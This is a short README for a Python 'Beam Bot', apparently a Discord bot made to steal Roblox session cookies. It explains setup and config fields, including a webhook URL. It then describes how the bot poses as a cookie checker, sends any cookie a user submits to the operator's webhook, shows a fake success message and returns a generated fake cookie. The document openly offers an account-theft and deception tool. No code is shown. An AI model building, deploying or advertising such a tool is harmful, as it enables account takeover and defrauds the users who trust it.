# Beam Bot
- This is a simple beam bot I made

# Setup
- Python required !
- https://www.python.org/
```python
pip install -r requirements.txt 
```
- Settings:
```
  "token": "The bot token",
  "Webhook": "Here the webhook url",
  "Prefix": "Here your prefix, e.g. !"
  "Company": "The title of the embed"
```

# Functions

- Integrated cookie sender to the webhook
- Semi-cookie checker
- Fake cookie thing
# What can it do?
```
If you type !cookie (roblox cookie),
a fake checker is created and it waits 5 seconds after that it sends a message (if there is a cookie in the message) 
and says "✅ Success! Your cookie will be sent to you shortly". 
Then after 2 seconds a generated cookie is sent
```
# What is an example of correct usage?
